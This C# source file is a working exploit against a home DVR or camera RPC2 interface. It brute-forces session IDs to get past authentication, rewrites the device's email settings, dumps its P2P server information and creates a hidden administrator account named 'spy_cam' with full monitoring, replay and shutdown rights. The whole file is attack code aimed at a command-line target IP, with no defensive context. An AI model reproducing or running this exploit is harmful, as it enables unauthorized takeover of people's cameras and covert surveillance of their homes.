using Leaf.xNet;
using Leaf.xNet.Services.Captcha;
using System;
using System.Net;
using System.Security.Authentication;
using System.Threading;

namespace HomeGuard_ussless_auth
{
    class Program
    {
        public static void Injectdata(string ip , int try_session)
        {
            for (int i = 1; i <= try_session; i++)
            {
                try {
                    using (var req = new HttpRequest())
                    {
                        string RandomUSA_AgentLocal = req.UserAgent = Http.RandomUserAgent();

                        var jsonContent = new StringContent("" +
                            "{\"method\":\"configManager.setConfig\"," +
                            "\"params\":{\"name\":\"Email\",\"table\":" +
                            "{\"Address\":\"smtp.gmail.com\",\"Anonymous\"" +
                            ":false,\"AttachEnable\":true,\"Enable\"" +
                            ":false,\"HealthReport\":{\"Enable\":false,\"" +
                            "Interval\":120},\"OnlyAttachment\":false,\"Password\"" +
                            ":\"password\",\"Port\":587,\"Receivers\":[],\"SendAddress\"" +
                            ":\"rahaaaaaaaaaaaaaaaaaat@gmail.com\",\"SendInterv\":0,\"SslEnable\"" +
                            ":true,\"Title\":\"DVR ALERT\",\"TlsEnable\":false,\"UserName\"" +
                            ":\"testtttt@gmail.com\"" +
                            "},\"options\":\"\"},\"session\":" + i + ",\"id\":116}")
                        {
                            ContentType = "application/json"
                        };
                        req.AddHeader("Host", "https://" + ip + "/RPC2");
                        req.AddHeader("User-Agent", RandomUSA_AgentLocal);

                        string result_post = req.Post("https://" + ip + "/RPC2", jsonContent).ToString();

                        if (!result_post.Contains("unauthorized"))
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("OK [id : " + i + "]\n");
                            Console.ResetColor();

                            
                            jsonContent = new StringContent(
                                "{\"method\":\"configManager.getConfig\",\"params\":{\"name\":\"T2UServer\"},\"session\":" + i + ",\"id\":116}")
                            {
                                ContentType = "application/json"
                            };

                            string p2p_info = req.Post("http://" + ip + "/RPC2", jsonContent).ToString()
                                .Replace(",", "\n")
                                .Replace("{", null)
                                .Replace("}", null);
                            Console.ForegroundColor = ConsoleColor.Gray;

                            Console.WriteLine("P2P info : \n" + p2p_info);
                            
                            string user_password = "123456";
                            string username = "spy_cam";

                            jsonContent = new StringContent("" +
                            "{\"method\":\"userManager.addUser\",\"params\":{\"user\":" +
                            "{\"Id\":4," +
                            "\"Name\":\"" + username + "\"," +
                            "\"Password\":\"" + user_password + "\"," +
                            "\"Type\":\"\",\"ModifiedTime\":\"\",\"Memo\":\"\"," +
                            "\"Group\":\"admin\"," +
                            "\"AuthorityList\":[\"SysSet\",\"ShutDown\",\"Monitor\",\"Monitor_01\"," +
                            "\"Monitor_02\",\"Monitor_03\",\"Monitor_04\",\"Replay\",\"Replay_01\"," +
                            "\"Replay_02\",\"Replay_03\",\"Replay_04\",\"Record\",\"Backup\",\"MHardisk\"," +
                            "\"MPTZ\",\"Account\",\"SysInfo\",\"Alarm\",\"Config\",\"QueryLog\",\"DelLog\"," +
                            "\"SysUpdate\",\"Control\",\"AutoMaintain\",\"GeneralConf\",\"EncodeConf\"," +
                            "\"RecordConf\",\"ComConf\",\"NetConf\",\"AlarmConf\",\"VideoConfig\",\"PtzConfig\"," +
                            "\"OutputConfig\",\"DefaultConfig\",\"DataFormat\",\"NetPreview\",\"NetPreview_01\"," +
                            "\"NetPreview_02\",\"NetPreview_03\",\"NetPreview_04\",\"BreakNetLimit\",\"VideoRecord\"," +
                            "\"MHardisk\",\"ShutDown\"],\"Reserved\":false,\"Sharable\":false}}" +
                            ",\"session\":" + i + ",\"id\":160}")
                            {
                                ContentType = "application/json"
                            };

                            string add_user = req.Post("https://" + ip + "/RPC2", jsonContent).ToString()
                                .Replace(",", "\n")
                                .Replace("}", null)
                                .Replace("{", null);

                            if (add_user.Contains("\"result\":true"))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine("Account created\n");
                                Console.ForegroundColor = ConsoleColor.Red;

                                Console.WriteLine("username : " + username);
                                Console.WriteLine("password : " + user_password + "\n");
                            }
                            Console.ResetColor();

                            Console.WriteLine(add_user);

                            i = try_session;
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine(result_post);
                            Console.ResetColor();
                        }
                    }
                }
                catch(Exception e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(e.ToString());
                    Console.ResetColor();
                    i = try_session;
                }
            }
            Console.ReadKey();
        }
        static void Main(string[] args)
        {
            string ip = null;
            int loop_try = 0;
            try
            {
                if (args[0] == "-ip")
                {
                    ip = args[1].ToString();
                }
                if (args[2] == "-l")
                {
                    loop_try = Convert.ToInt32(args[3]);
                }
                Injectdata(ip, loop_try);

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                Console.WriteLine("\n\n args : -ip 'ip:port' -l 'loop'");
                //Injectdata("192.168.0.102", 60);
            }
        }
    }
}
